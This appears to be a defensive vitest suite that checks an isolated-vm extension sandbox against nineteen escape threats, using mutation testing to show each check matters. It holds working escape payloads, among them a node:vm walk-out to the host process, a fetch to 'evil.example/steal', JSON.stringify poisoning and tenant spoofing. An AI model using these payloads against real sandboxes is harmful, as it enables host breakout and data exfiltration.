import { describe, it, expect, vi } from "vitest";
import vm from "node:vm";
import { readFileSync, writeFileSync, mkdirSync, rmSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import * as realModule from "./index";
import type {
  SandboxInstallation,
  HostCapabilities,
} from "./index";

/**
 * A18 — the escape-attempt suite. docs/programme/10-TRACK-A-FOUNDATION.md, exit
 * criterion verbatim:
 *
 *   "Suite passes; each test fails when its mitigation is removed (proving the
 *    test tests something). Wired as a blocking CI gate."
 *
 * Run: npm run test:escape
 *
 * Structure: one entry per A16 threat T01–T19. For every threat there are two
 * tests:
 *
 *   1. "contains the escape while the mitigation is present" — runs the exact
 *      adversarial payload against the REAL module and asserts the escape does
 *      not succeed.
 *   2. "proves the test: the escape succeeds when the mitigation is removed" —
 *      copies `src/index.ts`, applies a source mutation that removes exactly
 *      that threat's mitigation, loads the mutated module in a fresh module
 *      registry, and asserts the same payload NOW escapes.
 *
 * A test whose #2 cannot be made to fail is D013 — a test that passes
 * unconditionally. T01 (the genuine isolate itself) cannot be mutated away by
 * a string edit, so its proof is the control experiment: the exact payload
 * escapes a plain `node:vm` context, which is the implementation this isolate
 * replaced.
 */

const here = dirname(fileURLToPath(import.meta.url));
const SOURCE_PATH = join(here, "index.ts");
const MUT_DIR = join(here, ".escape-mutated");

const install = (
  over: Partial<SandboxInstallation> = {},
): SandboxInstallation => ({
  extensionId: "acme-widget",
  tenantId: "tenant-a",
  scopes: ["log:write"],
  ...over,
});

const hostSpy = (): HostCapabilities & { lines: unknown[][] } => {
  const lines: unknown[][] = [];
  return {
    lines,
    log: (_l, _m, args) => lines.push(args),
  };
};

type Mutation = { find: string; replace: string };

function applyMutations(source: string, mutations: Mutation[]): string {
  let out = source;
  for (const { find, replace } of mutations) {
    const count = out.split(find).length - 1;
    if (count !== 1) {
      throw new Error(
        `mutation anchor not unique (${count}): ${find.slice(0, 80)}`,
      );
    }
    out = out.replace(find, replace);
  }
  return out;
}

async function loadMutated(
  name: string,
  mutations: Mutation[],
): Promise<typeof realModule> {
  const source = readFileSync(SOURCE_PATH, "utf8");
  const mutated = applyMutations(source, mutations);
  const dir = join(MUT_DIR, name);
  rmSync(dir, { recursive: true, force: true });
  mkdirSync(dir, { recursive: true });
  // Unique module id per mutation, so vitest's module cache never serves a
  // stale transform for a later (differently-mutated) copy of index.ts.
  writeFileSync(join(dir, "index.ts"), mutated, "utf8");
  vi.resetModules();
  return (await import(`./.escape-mutated/${name}/index`)) as typeof realModule;
}

async function tryRun(fn: () => Promise<unknown>): Promise<{
  rejected: boolean;
  error?: string;
}> {
  try {
    await fn();
    return { rejected: false };
  } catch (e) {
    return { rejected: true, error: e instanceof Error ? e.message : String(e) };
  }
}

async function invoke(
  mod: typeof realModule,
  code: string,
  host: HostCapabilities,
  over: Partial<SandboxInstallation> = {},
  entry: { hook: string; args?: unknown[] } = { hook: "go" },
  opts: Partial<ConstructorParameters<typeof realModule.SandboxRunner>[0]> = {},
): Promise<{ result: unknown; usage: realModule.InvocationUsage }> {
  const runner = new mod.SandboxRunner(opts);
  return runner.run(code, install(over), host, entry);
}

interface EscapeSpec {
  threat: string;
  name: string;
  mutations: Mutation[];
  attempt: (mod: typeof realModule) => Promise<unknown>;
  escaped: (outcome: unknown) => boolean;
  /** Override vitest's per-test timeout (ms). Default 5000. */
  testTimeout?: number;
}

const ESCAPES: EscapeSpec[] = [
  {
    threat: "T02",
    name: "t02",
    // No ambient authority — nothing but a single bridge Reference is injected.
    // Removing the mitigation means the bootstrap starts exposing host-shaped
    // globals, e.g. `process`.
    mutations: [
      {
        find: "var stringify = JSON.stringify.bind(JSON);",
        replace:
          "globalThis.process = { pid: 1234 };\n    var stringify = JSON.stringify.bind(JSON);",
      },
    ],
    attempt: async (mod) => {
      const { result } = await invoke(
        mod,
        `const hooks = { go: () => typeof process };`,
        hostSpy(),
      );
      return result;
    },
    escaped: (outcome) => outcome === "object",
  },
  {
    threat: "T03",
    name: "t03",
    // Scope is re-checked on the host side at call time. Removing the check
    // lets an extension call a capability it was never granted.
    mutations: [
      {
        find: "if (!scopes.has(scope)) throw new SandboxScopeError(scope, extensionId);",
        replace: "if (false) throw new SandboxScopeError(scope, extensionId);",
      },
    ],
    attempt: async (mod) => {
      const host = hostSpy();
      host.dataWrite = vi.fn(async () => ({ ok: true }));
      await tryRun(() =>
        invoke(
          mod,
          `const hooks = { go: () => unierp.data.write("Invoice", "create", {}) };`,
          host,
          { scopes: ["data:read"] }, // read but not write
        ),
      );
      return (host.dataWrite as ReturnType<typeof vi.fn>).mock.calls.length;
    },
    escaped: (outcome) => outcome === 1,
  },
  {
    threat: "T04",
    name: "t04",
    // Isolate heap cap. With the cap present the hog is stopped by memory, not
    // by the wall-clock deadline; with the cap raised the hog spins until the
    // deadline and only the timeout stops it.
    mutations: [
      {
        find: "new ivm.Isolate({ memoryLimit: budget.memoryMb });",
        replace: "new ivm.Isolate({ memoryLimit: 512 });",
      },
    ],
    attempt: async (mod) => {
      const { error } = await tryRun(() =>
        invoke(
          mod,
          `const hooks = { go: () => { const a = []; for (let i = 0; i < 40; i++) a.push(new Array(1e6).fill(7)); while (true) {} return 1; } };`,
          hostSpy(),
          { budget: { memoryMb: 8, timeoutMs: 1000 } },
        ),
      );
      return error ?? "";
    },
    escaped: (outcome) => typeof outcome === "string" && /timed out/i.test(outcome),
    // The mutated isolate (memoryLimit 512) spins to the 1000ms sandbox
    // deadline; keep vitest's own budget comfortably above it.
    testTimeout: 15_000,
  },
  {
    threat: "T05",
    name: "t05",
    // The unierp global is frozen. Removing the freeze lets the extension
    // replace a capability with a shim.
    mutations: [
      {
        find: "writable: false, configurable: false,",
        replace: "writable: true, configurable: true,",
      },
    ],
    attempt: async (mod) => {
      const { result } = await invoke(
        mod,
        `const hooks = { go: () => {
           try { globalThis.unierp = { log: () => "hijacked" }; } catch (e) { return "blocked"; }
           return typeof globalThis.unierp.data === "object" ? "blocked" : "replaced";
         } };`,
        hostSpy(),
      );
      return result;
    },
    escaped: (outcome) => outcome === "replaced",
  },
  {
    threat: "T06",
    name: "t06",
    // Per-invocation query count. Removing the charge lets the extension issue
    // unbounded reads in one invocation.
    mutations: [
      {
        find: "if (usage[field] > limit) {",
        replace: "if (false) {",
      },
    ],
    attempt: async (mod) => {
      const host = hostSpy();
      host.dataRead = vi.fn(async () => ({ rows: [] }));
      await tryRun(() =>
        invoke(
          mod,
          `const hooks = { go: () => { for (let i = 0; i < 10; i++) unierp.data.read("Invoice", {}); return 1; } };`,
          host,
          { scopes: ["data:read"], budget: { queriesPerInvocation: 3 } },
        ),
      );
      return (host.dataRead as ReturnType<typeof vi.fn>).mock.calls.length;
    },
    escaped: (outcome) => outcome === 10,
  },
  {
    threat: "T07",
    name: "t07",
    // Egress is gated on the install-time approved set. Removing the check
    // lets an extension phone home to an unapproved host.
    mutations: [
      {
        find: "if (!approved.has(hostname)) {",
        replace: "if (false) {",
      },
    ],
    attempt: async (mod) => {
      const host = hostSpy();
      host.httpFetch = vi.fn(async () => ({ status: 200 }));
      await tryRun(() =>
        invoke(
          mod,
          `const hooks = { go: () => unierp.http.fetch("https://evil.example/steal") };`,
          host,
          { scopes: ["http:fetch"], approvedHosts: ["api.stripe.com"] },
          { hook: "go" },
          // The approval gate runs BEFORE resolution, so injecting a resolver
          // does not weaken the containment case; without it, the mutated
          // module fails at DNS instead of reaching httpFetch.
          { resolver: async () => ["8.8.8.8"] },
        ),
      );
      return (host.httpFetch as ReturnType<typeof vi.fn>).mock.calls.length;
    },
    escaped: (outcome) => outcome === 1,
  },
  {
    threat: "T08a",
    name: "t08a",
    // Wall-clock deadline on every entry into the isolate. Removing the
    // timeout lets a loop run to its natural completion past its budget.
    mutations: [
      {
        find: "{ timeout: budget.timeoutMs, result: { copy: true, promise: true } },",
        replace:
          "{ timeout: 2000, result: { copy: true, promise: true } },",
      },
    ],
    attempt: async (mod) => {
      const { rejected } = await tryRun(() =>
        invoke(
          mod,
          `const hooks = { go: () => { const t = Date.now(); while (Date.now() - t < 300) {} return 1; } };`,
          hostSpy(),
          { budget: { timeoutMs: 100 } },
        ),
      );
      return rejected;
    },
    escaped: (outcome) => outcome === false,
  },
  {
    threat: "T09a",
    name: "t09a",
    // The tenant is re-derived on the host side from the installation. Removing
    // the re-derivation lets the isolate's claimed tenant reach the host.
    mutations: [
      {
        find: 'host.log("log", { extensionId, tenantId }, args);',
        replace:
          'host.log("log", { extensionId, tenantId: (args[1] && args[1].tenantId) || tenantId }, args);',
      },
    ],
    attempt: async (mod) => {
      const seen: string[] = [];
      const host: HostCapabilities = {
        log: (_l, meta) => seen.push(meta.tenantId),
      };
      await invoke(
        mod,
        `const hooks = { go: () => { unierp.log("x", { tenantId: "tenant-victim" }); return 1; } };`,
        host,
        { tenantId: "tenant-a" },
      );
      return seen[0];
    },
    escaped: (outcome) => outcome === "tenant-victim",
  },
  {
    threat: "T10a",
    name: "t10a",
    // Fail-closed kill switch: once disabled, every later call throws.
    mutations: [
      {
        find: "if (revoked) throw new SandboxDisabledError(extensionId);",
        replace: "if (revoked && false) throw new SandboxDisabledError(extensionId);",
      },
    ],
    attempt: async (mod) => {
      const runner = new mod.SandboxRunner();
      await runner.disable("acme-widget");
      const { rejected } = await tryRun(() =>
        runner.run(`const hooks = { go: () => 1 };`, install(), hostSpy(), {
          hook: "go",
        }),
      );
      return rejected;
    },
    escaped: (outcome) => outcome === false,
  },
  {
    threat: "T11",
    name: "t11",
    // Bridge byte budget, checked BEFORE the host parses the payload.
    mutations: [
      {
        find: "if (byteLength(argsJson) > hardening.bridgeBytes) {",
        replace: "if (false) {",
      },
    ],
    attempt: async (mod) => {
      const host = hostSpy();
      host.dataWrite = vi.fn(async () => ({ ok: true }));
      await tryRun(() =>
        invoke(
          mod,
          `const hooks = { go: () => { const big = "x".repeat(50_000); unierp.data.write("Invoice", "create", { note: big }); return 1; } };`,
          host,
          { scopes: ["data:write"], hardening: { bridgeBytes: 8_192 } },
        ),
      );
      return (host.dataWrite as ReturnType<typeof vi.fn>).mock.calls.length;
    },
    escaped: (outcome) => outcome === 1,
  },
  {
    threat: "T12",
    name: "t12",
    // Revocation is shared state, re-read on every entry. Removing the check
    // lets a disabled extension keep running on other replicas.
    mutations: [
      {
        find: "if (revoked) throw new SandboxDisabledError(extensionId);",
        replace: "if (revoked && false) throw new SandboxDisabledError(extensionId);",
      },
    ],
    attempt: async (mod) => {
      const store = new mod.InMemoryRevocationStore();
      const runnerA = new mod.SandboxRunner({ revocationStore: store });
      const runnerB = new mod.SandboxRunner({ revocationStore: store });
      await runnerA.disable("acme-widget");
      const { rejected } = await tryRun(() =>
        runnerB.run(`const hooks = { go: () => 1 };`, install(), hostSpy(), {
          hook: "go",
        }),
      );
      return rejected;
    },
    escaped: (outcome) => outcome === false,
  },
  {
    threat: "T13",
    name: "t13",
    // SSRF-safe egress: https only. Removing the scheme check lets a file: or
    // http: URL reach the host fetcher.
    mutations: [
      {
        find: 'if (parsed.protocol !== "https:") {',
        replace: "if (false) {",
      },
    ],
    attempt: async (mod) => {
      const host = hostSpy();
      host.httpFetch = vi.fn(async () => ({ status: 200 }));
      await tryRun(() =>
        invoke(
          mod,
          `const hooks = { go: () => unierp.http.fetch("http://api.stripe.com/v1") };`,
          host,
          { scopes: ["http:fetch"], approvedHosts: ["api.stripe.com"] },
          { hook: "go" },
          { resolver: async () => ["8.8.8.8"] },
        ),
      );
      return (host.httpFetch as ReturnType<typeof vi.fn>).mock.calls.length;
    },
    escaped: (outcome) => outcome === 1,
  },
  {
    threat: "T14",
    name: "t14",
    // CPU is real CPU (isolate.cpuTime), not wall clock. Removing it bills the
    // host's own latency back to the extension.
    mutations: [
      {
        find: "let cpuMark = iso.cpuTime;",
        replace: "let cpuMark = BigInt(Date.now()) * 1000000n;",
      },
      {
        find: "const now = iso.cpuTime;",
        replace: "const now = BigInt(Date.now()) * 1000000n;",
      },
    ],
    attempt: async (mod) => {
      const host: HostCapabilities = {
        log: () => {},
        dataRead: async () => {
          await new Promise((r) => setTimeout(r, 400));
          return { rows: [] };
        },
      };
      const { usage } = await invoke(
        mod,
        `const hooks = { go: () => unierp.data.read("Invoice", {}) };`,
        host,
        { scopes: ["data:read"] },
      );
      return usage.cpuMs;
    },
    escaped: (outcome) => typeof outcome === "number" && outcome >= 300,
  },
  {
    threat: "T15",
    name: "t15",
    // The automatic breaker is separate from the operator kill switch. Removing
    // the separation makes a CPU trip read as a permanent disable.
    mutations: [
      {
        find: "return await this.revocationStore.isRevoked(extensionId);",
        replace:
          "return (await this.revocationStore.isRevoked(extensionId)) || this.breached.has(extensionId);",
      },
    ],
    attempt: async (mod) => {
      const runner = new mod.SandboxRunner({ cpuWindowMs: 1500 });
      await tryRun(() =>
        runner.run(
          `const hooks = { burn: () => { const t = Date.now(); while (Date.now() - t < 400) {} return 1; } };`,
          install({ budget: { cpuMsPerMinute: 100, timeoutMs: 5000 } }),
          hostSpy(),
          { hook: "burn" },
        ),
      );
      return runner.isDisabled("acme-widget");
    },
    escaped: (outcome) => outcome === true,
  },
  {
    threat: "T16",
    name: "t16",
    // A revocation is a persisted fact, read on entry. Removing the read makes
    // a pre-revoked extension run anyway.
    mutations: [
      {
        find: "return this.revoked.has(extensionId);",
        replace: "return false;",
      },
    ],
    attempt: async (mod) => {
      const store = new mod.InMemoryRevocationStore();
      await store.revoke("acme-widget");
      const runner = new mod.SandboxRunner({ revocationStore: store });
      const { rejected } = await tryRun(() =>
        runner.run(`const hooks = { go: () => 1 };`, install(), hostSpy(), {
          hook: "go",
        }),
      );
      return rejected;
    },
    escaped: (outcome) => outcome === false,
  },
  {
    threat: "T17",
    name: "t17",
    // The take an extension may request is capped. Removing the cap lets a
    // query ask for unbounded rows.
    mutations: [
      {
        find: 'if (typeof take === "number" && take > hardening.maxTake) {',
        replace: "if (false) {",
      },
    ],
    attempt: async (mod) => {
      const host = hostSpy();
      host.dataRead = vi.fn(async () => ({ rows: [] }));
      await tryRun(() =>
        invoke(
          mod,
          `const hooks = { go: () => unierp.data.read("Invoice", { take: 10_000 }) };`,
          host,
          { scopes: ["data:read"], hardening: { maxTake: 100 } },
        ),
      );
      return (host.dataRead as ReturnType<typeof vi.fn>).mock.calls.length;
    },
    escaped: (outcome) => outcome === 1,
  },
  {
    threat: "T18",
    name: "t18",
    // The host never parses serialisation performed inside the isolate: the
    // bootstrap captures the pristine JSON functions before any extension code
    // runs. Removing the capture lets a poisoned JSON.stringify control what
    // the host receives.
    mutations: [
      {
        find: "return host.applySyncPromise(undefined, [name, stringify(args ?? [])]);",
        replace:
          "return host.applySyncPromise(undefined, [name, JSON.stringify(args ?? [])]);",
      },
    ],
    attempt: async (mod) => {
      const host = hostSpy();
      host.dataRead = vi.fn(async () => ({ rows: [] }));
      const { rejected } = await tryRun(() =>
        invoke(
          mod,
          `const hooks = { go: () => {
             JSON.stringify = () => "EVIL";
             return unierp.data.read("Invoice", { take: 1 });
           } };`,
          host,
          { scopes: ["data:read"] },
        ),
      );
      return { rejected, called: (host.dataRead as ReturnType<typeof vi.fn>).mock.calls.length };
    },
    escaped: (outcome) => {
      const o = outcome as { rejected: boolean; called: number };
      return o.rejected && o.called === 0;
    },
  },
  {
    threat: "T19",
    name: "t19",
    // Concurrent isolates are capped per tenant. Removing the per-tenant cap
    // lets one tenant saturate the process.
    mutations: [
      {
        find: "if (current >= maxPerTenant) {",
        replace: "if (false) {",
      },
    ],
    attempt: async (mod) => {
      const registry = new mod.ConcurrencyRegistry();
      const runner = new mod.SandboxRunner({ concurrencyRegistry: registry });
      const spin = `const hooks = { spin: async () => { const t = Date.now(); while (Date.now() - t < 300) {} return 1; } };`;
      const base = install({
        budget: { timeoutMs: 5000 },
        hardening: { maxConcurrentIsolatesPerTenant: 1 },
      });
      const p1 = runner.run(spin, base, hostSpy(), { hook: "spin" });
      const p2 = runner.run(spin, base, hostSpy(), { hook: "spin" });
      let p2Rejected = false;
      try {
        await p2;
      } catch {
        p2Rejected = true;
      }
      await p1;
      return p2Rejected;
    },
    escaped: (outcome) => outcome === false,
  },
];

describe("T01 — context escape (node:vm walk-out)", () => {
  it("contains the escape in the isolate", async () => {
    // This exact expression walks out of a node:vm context to the host process.
    await expect(
      invoke(
        realModule,
        `const hooks = { go: () => this.constructor.constructor("return process")().pid };`,
        hostSpy(),
      ),
    ).rejects.toThrow();
  });

  it("proves the test: the same payload walks out of a plain node:vm context", () => {
    // The mitigation for T01 IS the genuine isolate. Its proof is the control
    // experiment: without the isolate (i.e. in the node:vm implementation this
    // replaced) the exact same payload escapes to the host process, so the
    // containment test above is testing something real.
    const escaped = vm.runInNewContext(
      `this.constructor.constructor("return process")().pid`,
    );
    expect(typeof escaped).toBe("number");
    expect(escaped).toBeGreaterThan(0);
  });
});

for (const esc of ESCAPES) {
  describe(`${esc.threat} — escape attempt`, () => {
    it("contains the escape while the mitigation is present", async () => {
      const outcome = await esc.attempt(realModule);
      expect(esc.escaped(outcome)).toBe(false);
    });

    it("proves the test: the escape succeeds when the mitigation is removed", async () => {
      const mutated = await loadMutated(esc.name, esc.mutations);
      const outcome = await esc.attempt(mutated);
      expect(esc.escaped(outcome)).toBe(true);
    }, esc.testTimeout);
  });
}
